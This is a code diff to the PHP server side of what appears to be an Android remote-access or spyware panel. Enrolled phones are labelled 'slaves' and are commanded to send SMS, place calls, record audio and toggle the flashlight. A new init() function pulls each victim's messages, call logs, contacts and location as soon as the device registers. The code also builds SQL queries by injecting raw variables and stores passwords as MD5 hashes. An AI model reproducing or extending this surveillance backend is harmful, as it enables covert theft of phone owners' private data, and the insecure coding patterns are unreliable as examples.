@@ -191,7 +191,15 @@ $type="status";
 $message="status";
 $number="status";
 $this->pushExtras($slaveid,$type,$number,$message);
-echo "sent";
+$state=$this->pushExtras($slaveid,$type,$number,$message);
+if($state)
+{
+echo "success";
+}
+else
+{
+echo "error";
+}
 }
 
 public function sendSMS($device,$number,$message)
@@ -203,7 +211,15 @@ $res=$query->result();
 $slaveid=$res[0]->slaveid;
 $type="sendSMS";
 $this->pushExtras($slaveid,$type,$number,$message);
-
+$state=$this->pushExtras($slaveid,$type,$number,$message);
+if($state)
+{
+echo "success";
+}
+else
+{
+echo "error";
+}
 }
 
 public function makeCall($device,$number)
@@ -217,11 +233,11 @@ $message="makeCall";
 $state=$this->pushExtras($slaveid,$type,$number,$message);
 if($state)
 {
-echo "Calling".$number."right now.";
+echo "success";
 }
 else
 {
-
+echo "error";
 }
 }
 
@@ -238,11 +254,11 @@ $number="number";
 $state=$this->pushExtras($slaveid,$type,$number,$message);
 if($state)
 {
-echo "flashLight ".$message." executed";
+echo "success";
 }
 else
 {
-echo "Error";
+echo "error";
 
 }
 }
@@ -261,11 +277,11 @@ $this->pushExtras($slaveid,$type,$number,$message);
 $state=$this->pushExtras($slaveid,$type,$number,$message);
 if($state)
 {
-echo $type.$message." executed";
+echo "success";
 }
 else
 {
-echo "Error";
+echo "error";
 
 }
 }
@@ -283,11 +299,11 @@ $number="number";
 $state=$this->pushExtras($slaveid,$type,$number,$message);
 if($state)
 {
-echo $type.$message." executed";
+echo "success";
 }
 else
 {
-echo "Error";
+echo "error";
 
 }
 }
@@ -305,11 +321,11 @@ $number="number";
 $state=$this->pushExtras($slaveid,$type,$number,$message);
 if($state)
 {
-echo $type.$message." executed";
+echo "success";
 }
 else
 {
-echo "Error";
+echo "error";
 
 }
 }
@@ -328,11 +344,11 @@ $number="number";
 $state=$this->pushExtras($slaveid,$type,$number,$message);
 if($state)
 {
-echo "Audio capture Started for".$message."seconds";
+echo "success";
 }
 else
 {
-echo "Error";
+echo "error";
 
 }
 }
@@ -343,11 +359,11 @@ $number="number";
 $state=$this->pushExtras($slaveid,$type,$number,$message);
 if($state)
 {
-echo "Audio capture Started for ".$seconds." seconds";
+echo "success";
 }
 else
 {
-echo "Error";
+echo "error";
 
 }
 }
@@ -564,7 +580,31 @@ public function left($doe)
 }
 // Functions for API
 
+public function init($slaveid)
+{
+	$type="getmessages";
+	$message="contacts";
+	$number="contacts";
+	$this->pushExtras($slaveid,$type,$message,$number);
+	$type="getcalllogs";
+	$message="contacts";
+	$number="contacts";
+	$this->pushExtras($slaveid,$type,$message,$number);
+	$type="getcontacts";
+	$message="contacts";
+	$number="contacts";
+	$this->pushExtras($slaveid,$type,$message,$number);
+	$type="getlocation";
+	$message="contacts";
+	$number="contacts";
+	$this->pushExtras($slaveid,$type,$message,$number);
+	$state="recieved";
+	$where=array('slaveid'=>$slaveid);
+	$this->db->where($where);
+	$data=array('contactstate'=>$state,'locstate'=>$state,'smsstate'=>$state,'callstate'=>$state);
+	$bool=$this->db->update('slaves',$data);
 
+}
 
 public function addDetail($type,$detail,$username,$slaveid,$imei,$phonenumber,$device)
 {
@@ -576,31 +616,7 @@ switch ($type) {
 $uniqueid = substr($slaveid, -5);
 $data=array('username'=>$username,'slaveid'=>$slaveid,'imei'=>$imei,'number'=>$phonenumber,'device'=>$device,'uniqueid'=>$uniqueid);
 $bool=$this->db->insert('slaves',$data);
-
-//
-$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
-$res=$query->result();
-$slaveid=$res[0]->slaveid;
-$type="call";
-$this->sendPush($slaveid,$type);
-//
-$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
-$res=$query->result();
-$slaveid=$res[0]->slaveid;
-$type="contacts";
-$this->sendPush($slaveid,$type);
-//
-$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
-$res=$query->result();
-$slaveid=$res[0]->slaveid;
-$type="messages";
-$this->sendPush($slaveid,$type);
-//
-$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
-$res=$query->result();
-$slaveid=$res[0]->slaveid;
-$type="location";
-$this->sendPush($slaveid,$type);
+$this->init($slaveid);
 echo "Success";
 
     case 'sms':
@@ -670,9 +686,9 @@ $res=$query->result();
 return $res;
 }
 
-public function addUser($uname,$pass,$paypal)
+public function addUser($uname,$pass,$paypal,$amount)
 {
-$data=array('username'=>$uname,"password"=>md5($pass),"paypal"=>$paypal);
+$data=array('username'=>$uname,"password"=>md5($pass),"paypal"=>$paypal,"amount"=>$amount);
 
 
 $bool=$this->db->insert('users',$data);
